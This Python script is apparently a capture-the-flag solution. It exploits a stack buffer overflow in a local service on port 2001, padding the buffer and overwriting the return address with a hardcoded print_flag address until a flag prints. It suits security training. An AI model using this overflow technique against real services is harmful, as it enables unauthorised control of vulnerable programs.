#!/usr/bin/python3

import socket
import telnetlib
from telnetlib import IAC, NOP


def connect_and_send(repeat):
    s = socket.create_connection(('localhost', 2001))

    data_count = str(0x420)
    data_count += '\n'
    s.send(data_count.encode('ASCII'))

    data = b'A'*0x408   # overwrite buffer
    data += b'B'*repeat   # overwrite base pointer and stuff
    data += 0x401803.to_bytes(8, 'little')  # set return address to print_flag
    data += b'\n'
    s.send(data)

    result = ''
    recv = s.recv(1024).decode('ASCII')
    while(recv):
        result = recv
        recv = s.recv(1024).decode('ASCII')
    telnet = telnetlib.Telnet()
    telnet.sock = s
    telnet.interact()

    s.close()

    return result


repeat = 0
result = connect_and_send(repeat)
while('FLAG' not in result):
    repeat += 1
    result = connect_and_send(repeat)

print(result)
